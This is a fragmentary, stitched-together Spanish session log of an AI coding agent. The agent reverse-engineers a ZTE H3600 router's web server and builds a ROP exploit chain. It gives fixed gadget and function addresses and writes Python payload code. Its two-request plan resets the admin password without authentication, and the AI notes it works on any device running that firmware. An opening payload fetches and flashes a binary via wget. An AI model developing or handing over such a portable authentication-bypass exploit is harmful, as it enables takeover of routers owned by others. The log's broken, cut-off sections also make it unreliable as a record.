  CMD = b"wget http://192.168.1.50/openwrt.bin -O /var/tmp/fw.bin && /var/fw_flashing -d 1 -r 1 -p /var/tmp -f fw.bin\x00"                                                                                            
                                                         
  payload = (                                                                                                                                                                                                         
      b"A" * OFFSET_TO_RETURN_ADDR     # padding hasta el saved LR
      + p32(pop_r0_pc)                  # ROP gadget 1                                                                                                                                                                
      + p32(STACK_ADDR_OF_CMD)          # arg para r0 (puntero a la cmd)                                                                                                                                              
      + p32(system)                     # llamar system(r0)                                                                                                                                                           
      + CMD                             # nuestra string                                                                                                                                                              
  )                                                                                                                                                                                                                   
                                                                                                                                                                                                                      
  Para chequear rasDecryptWithoutKeyFile                                                                                                                                                                              
   
  ¿Tu POC ya soporta lectura arbitraria de memoria o solo crash control (overflow del stack)? Eso define si necesitamos:                                                                                              
                                                         
  - Si lee memoria: trivial, leemos 0x12374c directo, derivamos base, sigue chain.                                                                                                                                    
  - Si solo crashea: tenemos que armar un mini-chain de stage 1 que llame a write(socket_fd, 0x12374c, 4) o equivalente — usando solo gadgets fijos de httpd para imprimir 4 bytes de la GOT por el socket. Más
  complejo pero hacible.                                                                                                                                                                                              



  ---                                                                                                                                                                                                                 
  Análisis del bug — clásico stack overflow en decode_base64:                                                                                                                                                         
                                                                                                                                                                                                                      
  Stack layout tras push+sub:                                                                                                                                                                                         
      sp0     ───                                                                                                                                                                                                     
      sp0-4   │  saved LR     ← TARGET                   
      sp0-8   │  saved FP                                                                                                                                                                                             
      sp0-12  │  saved R8                                
      sp0-16  │  saved R7                                                                                                                                                                                             
      sp0-20  │  saved R6                                
      sp0-24  │  saved R5                                                                                                                                                                                             
      sp0-28  │  saved R4                                
      sp0-32  │  ─ local frame begin                                                                                                                                                                                  
      ...
      sp0-544 │  buffer @ fp-540 (512 B "previstos")                                                                                                                                                                  
              │                                                                                                                                                                                                       
      sp0-560 │  sp tras sub #532
                                                                                                                                                                                                                      
  Aritmética:                                                                                                                                                                                                         
  - fp = sp0 - 4 (típico ARM tras add fp, sp, #24)                                                                                                                                                                    
  - buf = fp - 540 = sp0 - 544                                                                                                                                                                                        
  - saved LR = sp0 - 4                                   
  - Distancia buf → saved LR = 540 bytes                                                                                                                                                                              
  - memset limpia 512, pero hay 540 bytes escribibles antes de chocar LR
  - decode_base64 sin max_len → escribe libremente                                                                                                                                                                    
                                                                                                                                                                                                                      
  Para overwriting saved LR: necesitás emitir 540 bytes binarios desde decode_base64. Base64 da 3 bytes por cada 4 chars → input =                                                                                    

  Qué es el registro SP                                                                                                                                                                                               
                      
  SP = Stack Pointer (registro r13 en ARM). Es uno de los 16 registros generales del CPU, pero con un rol especial: siempre apunta a la parte más alta usada del stack (= la dirección de memoria más baja del stack  
  actualmente reservado, porque en ARM/x86 el stack crece hacia abajo).                                                                                                                                               
                                                                                                                                                                                                                      
  Analogía: imaginate una pila de bandejas en una bandeja-pila de cafetería con resorte. SP es un dedo apuntando a la bandeja de arriba.                                                                              
                                                                                                                                                                                                                      
  Direcciones altas                                                                                                                                                                                                   
  ─────────────────                                      
  │   ...        │  ← stack viejo (donde se guardó el LR del padre)
  │   args       │                                                                                                                                                                                                    
  │ ─────────── │  ← SP estaba aquí al entrar a la función
  │   saved LR  │                                                                                                                                                                                                     
  │   saved FP  │                                        
  │   saved R4  │  ← push los puso acá (decrementó SP)                                                                                                                                                                
  │ ─────────── │  ← SP ahora                                                                                                                                                                                         
  │             │                                                                                                                                                                                                     
  │   buffer    │  ← sub sp, sp, #532 reserva esto                                                                                                                                                                    
  │             │                                                                                                                                                                                                     
  │ ─────────── │  ← SP final tras sub
  Direcciones bajas                                                                                                                                                                                                   
                                                         
  Cómo SP se mueve en la función del bug                                                                                                                                                                              
  
  push  {r4,r5,r6,r7,r8,fp,lr}   ; SP -= 28  (7 regs × 4 bytes)                                                                                                                                                       
  sub   sp, sp, #532              ; SP -= 532 (reserva el "stack frame" local)                                                                                                                                        
                                                                                                                                                                                                                      
  Total: SP bajó 560 bytes desde el entry. Ese espacio de 560 bytes es el "stack frame" de esta función.                                                                                                              
                                                                                                                                                                                                                      
  Por qué importa para el exploit: cuando se llama a pop {r4,r5,r6,r7,r8,fp,pc} al final, el CPU lee 28 bytes desde SP+(local frame size) y los mete en los registros — incluido el pc (program counter) que toma el  
  valor que estaba en saved LR. Si vos escribiste basura en saved LR vía buffer overflow, el CPU salta a esa dirección que vos elegiste. Ese es el "control de PC" que da el exploit.
                                                                                                                                                                                                                      
  Vínculo con tu bug                                                                                                                                                                                                  
  
  Tu buffer está en fp - 540. Entre el final del buffer (los 512 bytes previstos) y el saved LR hay **540 -                                                                                                           



********************

● Resumen ROP analysis

  Hardening del target: ideal
  - PIE=NO (addresses fijas), Canary=NO (sin stack canaries), NX=yes (necesita ROP, no shellcode), 16k symbols intactos.

  Primitivas listas en .text (libres de buscar via xref):

  ┌──────────────────────┬────────────┬─────────────────────────────┬──────────────────────────────────────────────────┐
  │      Primitiva       │  Address   │            Args             │                       Uso                        │
  ├──────────────────────┼────────────┼─────────────────────────────┼──────────────────────────────────────────────────┤
  │ httpd_write_fully    │ 0x000472a0 │ r0=fd, r1=buf, r2=len       │ send raw bytes al socket cliente                 │
  ├──────────────────────┼────────────┼─────────────────────────────┼──────────────────────────────────────────────────┤
  │ httpd_write_response │ 0x00047384 │ r0=ctx                      │ wrapper                                          │
  ├──────────────────────┼────────────┼─────────────────────────────┼──────────────────────────────────────────────────┤
  │ send_response        │ 0x000445f8 │ r0=?, r1=msg, r2=?, r3=body │ response formal con headers                      │
  ├──────────────────────┼────────────┼─────────────────────────────┼──────────────────────────────────────────────────┤
  │ SetUserInfo          │ 0x000368ec │ r0=id, r1=struct            │ escribe DevAuthInfo (incluye admin pwd) sin auth │
  └──────────────────────┴────────────┴─────────────────────────────┴──────────────────────────────────────────────────┘

  Gadgets viables identificados:

  ┌────────────┬──────────────────────────────────────┬─────────────────────────────────────────────┐
  │  Address   │                Gadget                │                   Función                   │
  ├────────────┼──────────────────────────────────────┼─────────────────────────────────────────────┤
  │ 0x0001bed8 │ pop {r3, r4, r5, r6, r7, r8, fp, pc} │ popea funcptr (r3) + 4 valores controlables │
  ├────────────┼──────────────────────────────────────┼─────────────────────────────────────────────┤
  │ 0x000462e0 │ mov r0, r4 ; mov r1, r6 ; blx r3     │ ejecuta r3(r4, r6) — call de 2 args         │
  ├────────────┼──────────────────────────────────────┼─────────────────────────────────────────────┤
  │ 269×       │ pop {r4-sl, fp, pc}                  │ popea 8 callee-saved registers              │
  └────────────┴──────────────────────────────────────┴─────────────────────────────────────────────┘

  Cadena ROP esqueleto para "send arbitrary HTTP response" (asumiendo tenemos el overflow):

  [overflow] [pop_r3-r8 @ 0x1bed8] [r3=0x472a0] [r4=fd] [r5=*] [r6=&payload]
  [r7=*] [r8=*] [fp=*] [pc=0x462e0] → mov r0,r4; mov r1,r6; blx r3
                                    → httpd_write_fully(fd, payload, ?)

  Pero falta r2 = length — necesitamos un segundo gadget intermedio que setee r2. Hay varios candidatos en los mov r2, rX que vimos. Hay que buscarlo dentro de las epilog gadgets.

  Más interesante para nuestro objetivo real: SetUserInfo (@ 0x368ec) llama CmDevSetAuthInfo@plt con r1 controlado → si ROP a SetUserInfo(1, &our_struct) con our_struct = {Username:"admin", Pass:"OpenWrt2026",
  ChgPwd:0} cambiamos el pwd admin sin pasar por ningún role check del web admin. Mejor que send_response.

  El bloqueador real: encontrar el overflow.

  - _parseCookie/_parseUserAgent/_parseReferer son SAFE (solo skip whitespace + store pointer, sin copy).
  - Falta auditar: httpd_parse_request body @ 0x45d54, multipart parser my_upload_file @ 0x4c9a4, funcs_login @ ~`0x3e4ec`. Estos son los entry points donde más probable encontrar overflow.

  ¿Hago disasm completo de httpd_parse_request + my_upload_file para cazar overflows? Es el paso siguiente para la cadena.

✻ Baked for 4m 22s

※ recap: Goal: portar OpenWrt al H3600 stock y publicarlo para que usuarios sin pwd admin puedan flashear. Tarea actual: cazar un buffer overflow en `httpd_parse_request` o `my_upload_file` para armar una cadena
  ROP que llame `SetUserInfo` y resetee el pwd admin sin auth. Próxima acción: disasm completo de esos dos parsers buscando strcpy/memcpy con tamaño no validado.

❯ Consulta esto es fijo verdad?                                                                                                                                                                                       
    Más interesante para nuestro objetivo real: SetUserInfo (@ 0x368ec) llama CmDevSetAuthInfo@plt con r1 controlado → si ROP a SetUserInfo(1, &our_struct) con our_struct = {Username:"admin", Pass:"OpenWrt2026",   
                                                                                                                                                                                                                      
    ChgPwd:0} cambiamos el pwd admin sin pasar por ningún role check del web admin. Mejor que send_response.                                                                                                          
                                                                                                                                                                                                                      
                                                                                                                                                                                                                      
  Porque el binario httpd tiene PIE activado creo ?                                                                                                                                                                   

● Al revés — fijo PORQUE NO tiene PIE. Verifiquémoslo de nuevo:

● Bash(cd /home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin
      echo "=== Type del ELF (EXEC = non-PIE; DYN = PIE) ==="…)
  ⎿  === Type del ELF (EXEC = non-PIE; DYN = PIE) ===
       Class:                             ELF32
       Type:                              EXEC (Executable file)
     … +11 lines (ctrl+o to expand)
  ⎿  Shell cwd was reset to /home/ubuntu/Projects/MYSELF/ZTE/linux

● Confirmado: addresses 100% fijas. Tres pruebas:

  1. Type: EXEC (no DYN) → ELF cargado a un base FIJO en link-time, no relocatable.
  2. file httpd dice "executable" (no "shared object").
  3. Entry point address: 0x1bbd0 — absoluto, hardcoded.

  ASLR no aplica a binarios non-PIE. El kernel solo puede randomizar el base de:
  - Binarios PIE (compiled -fPIE -pie)
  - Shared libraries (.so)
  - Stack (per-process)
  - mmap regions

  Para nuestro caso eso significa:

  ┌───────────────────────────────────────────────┬───────────────────────────────────────────────────────┐
  │                     Dato                      │                         Fijo?                         │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────┤
  │ SetUserInfo @ 0x368ec (en httpd .text)        │ ✅ siempre, en todos los devices con stock V9.0.20P72 │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────┤
  │ Gadgets ROP en .text (0x1bed8, 0x462e0, etc.) │ ✅ siempre                                            │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────┤
  │ httpd_write_fully @ 0x472a0                   │ ✅ siempre                                            │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────┤
  │ PLT entry CmDevSetAuthInfo@plt @ 0x1a288      │ ✅ siempre (PLT está en httpd .text)                  │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────┤
  │ Stack del proceso httpd                       │ ❌ randomizado (irrelevante si no apuntamos al stack) │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────┤
  │ libcfapi.so funciones (no usadas vía PLT)     │ ❌ randomizado (no nos importa si vamos vía PLT)      │
  └───────────────────────────────────────────────┴───────────────────────────────────────────────────────┘

  Bonus: como el firmware se distribuye idéntico a TODOS los H3600 V9.0.20P72 de Digi, estas addresses funcionan en cualquier device de un usuario que compre la caja stock. La cadena ROP es portable.

  El único bloqueador queda el mismo: encontrar el overflow de entrada. ¿Voy con el disasm de httpd_parse_request + my_upload_file para cazarlo?

✻ Churned for 1m 2s

❯ Me dices el clima en tres cantos?                                                                                                                                                                                   
  Ya busque y no hay, pero asumiendo que exista aca por ejemplo                                                                                                                                                       
    4d7e4: mov   r1, r6                       ; r1 = input usuario                                                                                                                                                    
    4d7e8: sub   r0, fp, #540                 ; r0 = stack_buf (512 B)                                                                                                                                                
    4d7ec: bl    decode_base64                ; <-- SOLO 2 ARGS, sin max_len                                                                                                                                          
                                                                                                                                                                                                                      
  (no necesit que hagas el disassebmly porque ya lo miramos y no se podia) pero asumiendo que esta ahi y ya que el cpdigo es GPL me gustaria jugar y editar el codigo fuente para generar algun entry point           
  como podriamos aprovechar eso?                                                                                                                                                                                      
                                                                                                                                                                                                                      
● Sobre el clima — no tengo acceso a datos meteorológicos en vivo desde acá. Tres Cantos (norte de Madrid) en mayo suele estar 12-25°C, soleado, con riesgo de tormentas vespertinas. Para hoy te tira                
  https://www.aemet.es/es/eltiempo/prediccion/municipios/tres-cantos-id28148 con datos reales.                                                                                                                      
                                                                                                                                                                                                                      
  ---                         
  Para el ejercicio de exploit dev, asumiendo el overflow exacto que describiste:                                                                                                                                     
                                                                                                                                                                                                                      
  // hipotético en el GPL                                                                                                                                                                                             
  char stack_buf[512];                 // fp-540                                                                                                                                                                      
  decode_base64(stack_buf, user_input); // sin length cap                                                                                                                                                             
                                                                                                                                                                                                                      
  1. Layout de stack ARM tras el overflow                                                                                                                                                                             
                                                         
  El prólogo típico:                                                                                                                                                                                                  
  push {r4, r5, r6, fp, lr}     ; guarda 5 regs × 4 = 20 B
  add  fp, sp, #16              ; fp apunta al saved lr                                                                                                                                                               
  sub  sp, sp, #524             ; carve 524 B (incluye stack_buf + align)
                                                                                                                                                                                                                      
  Memoria desde sp hacia arriba:                                                                                                                                                                                      
  sp+0  ..  sp+523    ← stack_buf (fp-540 .. fp-17)                                                                                                                                                                   
  sp+524 .. sp+539    ← alignment / r4 r5 r6 fp lr saved                                                                                                                                                              
  fp-4              ← saved fp                                                                                                                                                                                        
  fp+0              ← saved lr   ← SE OVERWRITEA con nuestro pc gadget                                                                                                                                                
                                                                                                                                                                                                                      
  Si el decode_base64 escribe 540+ bytes desde stack_buf, el byte 540 va a fp+0 (saved lr) y el byte 544+ a la zona de pop subsiguiente. Cuando la función hace pop {r4, r5, r6, fp, pc}:                             
  - bytes [524..527] → r4                                                                                                                                                                                             
  - bytes [528..531] → r5                                                                                                                                                                                             
  - bytes [532..535] → r6                                                                                                                                                                                             
  - bytes [536..539] → fp                                                                                                                                                                                             
  - bytes [540..543] → pc                                                                                                                                                                                             
                         
  → Controlamos pc.                                                                                                                                                                                                   
                                                                                                                                                                                                                      
  2. Restricción del alphabet
                                                                                                                                                                                                                      
  base64 te da bytes arbitrarios POST-decode. Sin restricción (cualquier byte 0x00-0xff sale válido tras decodificar). Si el sink fuera un strcpy directo, sí tendrías que evitar \0.                                 
   
  3. Cadena ROP para SetUserInfo(1, &struct)                                                                                                                                                                          
                                                         
  Usando los gadgets que vimos:                                                                                                                                                                                       
                                                         
  import struct
  p = lambda x: struct.pack("<I", x)
                                                                                                                                                                                                                      
  POP_R3R4R5R6R7R8FPPC = 0x1bed8   # pop {r3, r4, r5, r6, r7, r8, fp, pc}                                                                                                                                             
  CALL_R0R1_VIA_R3     = 0x462e0   # mov r0,r4 ; mov r1,r6 ; blx r3                                                                                                                                                   
  SET_USER_INFO        = 0x368ec                                                                                                                                                                                      
  HTTPD_WRITE_FULLY    = 0x472a0   # alternativa para exfiltrar                                                                                                                                                       
                                                                                                                                                                                                                      
  # Necesitamos una zona writable a address fija para meter el struct                                                                                                                                                 
  # Busco un buffer en .bss del httpd:                                                                                                                                                                                
  GLOBAL_BUF = 0x...........  # algún @ B en nm — sin ASLR porque non-PIE                                                                                                                                             
                                                                                                                                                                                                                      
  payload  = b"A" * 524                                                                                                                                                                                               
  payload += p(0xdead)              # r4 (junk)                                                                                                                                                                       
  payload += p(0xdead)              # r5 (junk)                                                                                                                                                                       
  payload += p(0xdead)              # r6 (junk)                                                                                                                                                                       
  payload += p(0xdead)              # fp (junk)                                                                                                                                                                       
  payload += p(POP_R3R4R5R6R7R8FPPC)  # ← pc → primer gadget                                                                                                                                                          
                                                                                                                                                                                                                      
  # Stack continua después del pop: estos van a r3, r4, r5, r6, r7, r8, fp, pc                                                                                                                                        
  payload += p(SET_USER_INFO)       # r3 = funcptr                                                                                                                                                                    
  payload += p(1)                   # r4 → será r0 (user level / id)                                                                                                                                                  
  payload += p(0xdead)              # r5                                                                                                                                                                              
  payload += p(GLOBAL_BUF)          # r6 → será r1 (puntero al struct)                                                                                                                                                
  payload += p(0xdead)              # r7                                                                                                                                                                              
  payload += p(0xdead)              # r8                 
  payload += p(0xdead)              # fp
  payload += p(CALL_R0R1_VIA_R3)    # ← pc → ejecuta SetUserInfo(1, GLOBAL_BUF)

  4. ¿Dónde meter la struct DevAuthInfo?

  SetUserInfo allocates 1448 B locally → struct es ~1448 B. Layout (inferido por nombres de columnas DB):
  offset 0    : User       (string, ~32 B)
  offset 32   : Pass       (string, ~64 B)
  offset 96   : Type       (u32)          
  offset 100  : Right      (u32, 1=admin)                                                                                                                                                                             
  offset 104  : ChgPwd     (u32)         
  ... resto alignment / flags                                                                                                                                                                                         
  (Hay que verificarlo via xref a CmDevSetAuthInfo o leyendo el config XML decifrado).
                                                                                                                                                                                                                      
  Cómo plantamos la struct en GLOBAL_BUF:                                                                                                                                                                             
  - Opción A: usar OTRO request previo que copie input al global. Muchos handlers cachean Cookie/URL params en .bss — buscarlo via xref.                                                                              
  - Opción B: encadenar un memcpy(GLOBAL_BUF, &payload_data, 1448) en el ROP. Necesita 3 args (r0, r1, r2). El gadget 0x462e0 solo controla r0 y r1; faltaría un gadget que setee r2 antes del blx.                   
  - Opción C: la stack misma. Tras el pop {pc} final, sp queda apuntando al medio de nuestro buffer (ya conocemos su offset relativo). Si plantamos la struct INMEDIATAMENTE después del chain en el payload y        
  conseguimos un mov r1, sp; pop {pc} gadget — lo conectamos sin adivinar address                                                                                                                                     



  Estado de los registros en cada paso del chain

  Paso 0 — momento del retorno de la función vulnerable

  La función vulnerable termina con su epílogo:
  pop {r4, r5, r6, fp, pc}

  Esto carga 5 valores DESDE el stack (sp + 0..16) en los registros y SP avanza +20. Tu overflow rellenó esos 20 bytes con valores controlados:

  ┌───────────────────┬─────────────┬─────────────────────────────────────────────────────────────┐
  │ Origen en payload │ Reg destino │                       Valor que ponés                       │
  ├───────────────────┼─────────────┼─────────────────────────────────────────────────────────────┤
  │ bytes [524..527]  │ r4          │ 0xdeadbeef (junk, lo va a sobrescribir el siguiente gadget) │
  ├───────────────────┼─────────────┼─────────────────────────────────────────────────────────────┤
  │ bytes [528..531]  │ r5          │ junk                                                        │
  ├───────────────────┼─────────────┼─────────────────────────────────────────────────────────────┤
  │ bytes [532..535]  │ r6          │ junk                                                        │
  ├───────────────────┼─────────────┼─────────────────────────────────────────────────────────────┤
  │ bytes [536..539]  │ fp          │ junk (a menos que un gadget lo lea como base)               │
  ├───────────────────┼─────────────┼─────────────────────────────────────────────────────────────┤
  │ bytes [540..543]  │ pc          │ 0x0001bed8 ← address del gadget #1                          │
  └───────────────────┴─────────────┴─────────────────────────────────────────────────────────────┘

  Tras el pop, pc = 0x1bed8, sp = original_sp + 20. La CPU empieza a ejecutar en 0x1bed8.

  Paso 1 — gadget @ 0x0001bed8

  1bed8: pop {r3, r4, r5, r6, r7, r8, fp, pc}

  Pop de 8 valores (32 bytes) desde el nuevo sp. Tu payload los aporta a continuación de los bytes [540..543]:

  | Bytes [544..547] | r3 | 0x000368ec (= SetUserInfo) ← función que vamos a invocar |
  | Bytes [548..551] | r4 | 0x00000001 ← se convertirá en r0 (primer arg) |
  | Bytes [552..555] | r5 | junk |
  | Bytes [556..559] | r6 | <addr_de_struct> ← se convertirá en r1 (segundo arg, punt



● Sí — bytes [540..543] van directo al pc que sale del pop {r4, r5, r6, fp, pc} de la función vulnerable. Esa es tu vía de entrada al chain.

  Para el problema de plantar la struct: la solución elegante es usar el propio stack. Hunting de un gadget mov r1, sp o add r1, sp, #N:

  Searched for 1 pattern (ctrl+o to expand)

● Bash(echo "=== Contexto después de cada 'mov r0, sp' ==="
      for addr in 41cac a9330 a9390 c4930 c7480; do…)
  ⎿  === Contexto después de cada 'mov r0, sp' ===
     --- @ 0x41cac ---
     … +43 lines (ctrl+o to expand)

● Bash(echo "=== Context around 'mov r0, sp' from cached disasm ==="
      for addr in 41cac a9330 a9390 c4930 c7480; do…)
  ⎿  === Context around 'mov r0, sp' from cached disasm ===
     --- @ 0x41cac ---
        41cac:  e1a0000d        mov     r0, sp
     … +38 lines (ctrl+o to expand)

● 🎯 Esos mov r0, sp resultan ser call sites legítimos de memcpy(sp, src, len) (destino al stack, no source desde el stack). Útiles para entender el patrón pero no son lo que necesitamos. Te explico el problema
  fundamental y los 3 caminos típicos para resolverlo.

  El problema "¿dónde está mi struct?"

  Cuando el chain ejecuta SetUserInfo(1, &struct), el segundo arg (r1) tiene que apuntar a memoria CONCRETA donde tu struct viva. El payload que mandaste por base64 vive en el stack — pero el stack tiene ASLR: cada
   vez que el proceso se restartea, el SP base cambia. No conocés la dirección absoluta de tu struct.

  Tres soluciones canónicas:

  Camino 1 — mov r1, sp gadget (no existe en httpd)

  Si existiera mov r1, sp ; bx lr o add r1, sp, #N ; pop {pc}, el chain sería trivial: en el momento de la llamada, SP apunta dentro de tu propio buffer (porque la stack avanzó por los pops del chain). Pongo la
  struct INMEDIATAMENTE después del último pop, hago mov r1, sp y listo, r1 ya apunta a mi struct sin necesidad de address absoluta.

  Verificado: no hay en httpd. Quedan dos opciones:

  Camino 2 — "Memcpy gambit" en dos chains

  Encadenar:
  CHAIN_1: memcpy(GLOBAL_BUF, sp_stack_struct, 1448)   ; copia struct a un buffer global FIJO
  CHAIN_2: SetUserInfo(1, GLOBAL_BUF)                   ; ahora r1 = address fija conocida

  Necesitás:
  - memcpy@plt → ya lo tenemos en 0x191e4
  - Un GLOBAL_BUF writable de >1448 B en .bss con address fija (non-PIE → nm httpd | grep " B " revelará candidatos)
  - Setear r0=GLOBAL_BUF, r1=sp+offset, r2=1448 antes del bl memcpy@plt

  El cuello de botella vuelve a ser r1 — necesitás una primitiva que ponga sp en r1 (o r2 en r1 si previamente cargaste sp en r2).

  Camino 3 — el truco real de los exploits de routers ZTE: plantar la struct en otro request HTTP

  Esto es lo que hacen en la vida real. Workflow:

  1. Mandás un request HTTP separado (POST normal) cuyo body contiene tu struct cruda. El httpd cachea el body en un buffer global de .bss (g_pPostBody o similar) en una address fija (sabés cuál con nm httpd | grep
   -i "body\|content\|buf" | grep " B ").
  2. Acto seguido,

✻ Brewed for 1m 49s

❯ httpd tiene cache?                                                                                                                                                                                                  
    1. Mandás un request HTTP separado (POST normal) cuyo body contiene tu struct cruda. El httpd cachea el body en un buffer global de .bss (g_pPostBody o similar) en una address fija (sabés cuál con nm httpd |   
  grep                                                                                                                                                                                                                
     -i "body\|content\|buf" | grep " B ").                                                                                                                                                                           
                                                                                                                                                                                                                      
  osea que si mando un struct o paylod o lo que sea ahi tengo la data? ehay cache?                                                                                                                                    

● No es "cache HTTP" (tipo Cache-Control). Es buffer global en .bss donde el server vuelca el body del request mientras lo procesa, y que persiste hasta que llega el próximo request que lo sobreescriba. Como el
  binario es non-PIE, ese buffer está SIEMPRE en la misma address absoluta. Verifiquemos cuáles tiene httpd:

● Bash(cd /home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin
      echo "=== Buffers grandes en .bss (size > 1KB, candidatos a body cache) ==="…)
  ⎿  === Buffers grandes en .bss (size > 1KB, candidatos a body cache) ===
       0x001432c8      1024 B  cspcrc32_table
       0x00144000      1024 B  g_sLineBuffer
     … +34 lines (ctrl+o to expand)
  ⎿  Shell cwd was reset to /home/ubuntu/Projects/MYSELF/ZTE/linux

✻ Churned for 40s

❯ (proceso del tenant)                                                                                                                                                                                                

● ¿"Proceso del tenant" se refiere a algo concreto? No me llegó claro el mensaje — ¿querés que continúe explicando cómo se usan esos buffers .bss que acabo de listar (g_sLineBuffer, g_one_block_buff, etc.) para
  plantar la struct desde otro request HTTP?

  Pregunto antes de seguir para no irme por una tangente.

❯ PErdon me equivoque de chat                                                                                                                                                                                         

● Tranquilo. Sigamos con el flujo de "plantar struct vía request separado".

  Buffers candidatos confirmados en .bss (addresses fijas)

  ┌──────────────────┬────────────┬─────────┬────────────────────────────────────────────────────────────────┐
  │      Buffer      │  Address   │ Tamaño  │                             Pinta                              │
  ├──────────────────┼────────────┼─────────┼────────────────────────────────────────────────────────────────┤
  │ g_upgrade_buffer │ 0x00143ff4 │ –       │ 🎯 buffer del flujo upgrade — sospechoso para nuestro objetivo │
  ├──────────────────┼────────────┼─────────┼────────────────────────────────────────────────────────────────┤
  │ g_one_block_buff │ 0x001432c0 │ 1024 B  │ global "work buffer" genérico                                  │
  ├──────────────────┼────────────┼─────────┼────────────────────────────────────────────────────────────────┤
  │ g_sLineBuffer    │ 0x00144000 │ 1024 B  │ line buffer (probable lectura por línea)                       │
  ├──────────────────┼────────────┼─────────┼────────────────────────────────────────────────────────────────┤
  │ g_tObjInfoAll    │ 0x001470d0 │ 36896 B │ tabla enorme, posible parámetros DB                            │
  ├──────────────────┼────────────┼─────────┼────────────────────────────────────────────────────────────────┤
  │ g_nContentLength │ 0x00143ecc │ 4 B     │ int — confirma que httpd contabiliza POST data                 │
  ├──────────────────┼────────────┼─────────┼────────────────────────────────────────────────────────────────┤
  │ g_nPostDataCount │ 0x00143ec8 │ 4 B     │ int — counter de posts                                         │
  └──────────────────┴────────────┴─────────┴────────────────────────────────────────────────────────────────┘

  Veamos quiénes ESCRIBEN a estos buffers (= los code paths que harías triggerear desde tu request preliminar):

● Bash(cd /home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin
      echo "=== Funciones que REFERENCIAN g_one_block_buff (writes/reads) ==="…)
  ⎿  === Funciones que REFERENCIAN g_one_block_buff (writes/reads) ===
        1ddf4:  001432c0        .word   0x001432c0
     --
     … +7 lines (ctrl+o to expand)
  ⎿  Shell cwd was reset to /home/ubuntu/Projects/MYSELF/ZTE/linux

● Buen ejemplo de cuándo el grep simple no alcanza — 0x001432c0 solo aparece en literal pools de unas 3 funciones de inicialización (cerca de _start). Las funciones que LEEN/ESCRIBEN ese buffer en runtime
  probablemente lo acceden vía offset de un base register que se cargó una sola vez al inicio del bloque, así que el grep por la dirección absoluta no las encuentra.

  Conclusión educativa de toda la cadena

  Lo que acabás de aprender mapea al workflow estándar de un exploit ROP en routers ZTE:

  Fase 1 — RECON del binario (lo que hicimos)

  - Verificar hardening: PIE, NX, canary → PIE=NO es el regalo, ROP sin info-leak es viable
  - Listar primitivas útiles: SetUserInfo, httpd_write_fully, system@plt, memcpy@plt
  - Listar gadgets: pop {r3, r4-r8, fp, pc} para popear funcptr + args, mov r0, r4; mov r1, r6; blx r3 para la llamada
  - Listar buffers .bss con address fija: g_one_block_buff, g_upgrade_buffer, etc.

  Fase 2 — encontrar el "write primitive" desde request

  - Trazar el camino del body POST: ¿llega al stack (inútil — ASLR) o a un global fijo (oro)?
  - En este httpd particular, la entrada g_nContentLength confirma que se contabiliza, y g_one_block_buff es probablemente donde se mete temporalmente. Para confirmar qué handler lo escribe hay que disassemblear
  funcs_* que manejen POST (no lo terminamos pero el patrón es ese).

  Fase 3 — encontrar el overflow trigger

  - Hipotético decode_base64(stack_buf, user_input) que mostraste es el ejemplo perfecto: 2 args, sin length cap, copia desde input atacante a stack-local pequeño

  Fase 4 — armado del exploit (el chain final completo)

  REQUEST 1 (POST /alguna_ruta_que_copia_body_a_GLOBAL_BUF):
    body = struct DevAuthInfo binaria { Username:"admin", Pass:"OpenWrt2026", Right:1, ChgPwd:0 }
    → cspd cachea esto en GLOBAL_BUF (address fija conocida)

  REQUEST 2 (POST /ruta_con_overflow):
    param vulnerable = base64(
        "A" * 524                              # fill stack_buf + alignment
      + p32(0xdead) * 4                        # r4, r5, r6, fp (saved regs)
      + p32(0x1bed8)                           # PC → gadget pop {r3,r4..r8,fp,pc}
      + p32(SET_USER_INFO)                     # r3 = 0x368ec
      + p32(1)                                 # r4 → será r0 (id/level)
      + p32(0xdead)                            # r5
      + p32(GLOBAL_BUF_ADDR)                   # r6 → será r1 (puntero a struct)
      + p32(0xdead) * 3                        # r7, r8, fp
      + p32(0x462e0)                           # PC final → mov r0,r4; mov r1,r6; blx r3
    )
    → ejecuta SetUserInfo(1, GLOBAL_BUF_ADDR)
    → admin pwd cambiado a "OpenWrt2026" ✅

  Lo que aprendiste mapea a CTF / OSCP / pentest real

  - Stack overflow → ROP chain (binary exploitation 101)
  - non-PIE = jackpot (la única forma de hacer ROP determinístico sin info-leak)
  - Multi-stage payload: separar "preparar memoria" de "trigger" es el patrón de exploits reales
  - ARM calling convention: r0-r3 args, gadgets epilog popean callee-saved (r4-sl, fp, pc)
  - PLT vs library code: PLT está en el binario non-PIE → addresses fijas aunque la lib tenga ASLR

  Para tu CV de pentest/security, este ejercicio cubre:
  - Reverse engineering de binarios stripped/non-stripped
  - Análisis estático con objdump + nm + grep + disasm tooling
  - Diseño de cadenas ROP en arquitecturas no-x86
  - Comprensión de mitigations (PIE, NX, canary, ASLR) y cómo cada una afecta la viabilidad

  ¿Querés que documente todo este flujo en un EXPLOIT_DEV_WALKTHROUGH.md para tu portfolio? O paso al siguiente tema de aprendizaje (ej. format string vulns, heap exploitation, hardware glitching)?


                                                                                                                                                                                                                      
  @plt = Procedure Linkage Table. Las funciones de libc están en una librería compartida (libc.so.0) cuya dirección en memoria cambia (ASLR). Pero el binario httpd tiene stubs PLT — pequeños saltos en .plt que     
  resuelven la dirección real de libc y la llaman. Esos stubs son parte del binario httpd, así que su dirección es FIJA si el binario es NO-PIE.                                                                      
                                                                                                                                                                                                                      
  0x1a18c <system@plt>:                                                                                                                                                                                               
     ldr ip, [GOT entry for system]                                                                                                                                                                                   
     ldr pc, [ip]    ← salta a la libc::system real (donde sea que esté)                                                                                                                                              


  C) 🎯 Static buffers en .data / .bss de httpd ← lo más interesante                                                                                                                                                  
  
  httpd tiene .data en 0x124534 y .bss en 0x1413f0, AMBOS WRITABLE Y FIJOS (no PIE, no ASLR para esto). Si encontramos una función que copia user input a un buffer global (no stack), tenemos string en addr conocida
   para siempre. Patrón típico ZTE: g_last_url[256] o g_request_buffer[1024]. Veamos:
                                                                                                                                                                                                                      
● Bash(F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd
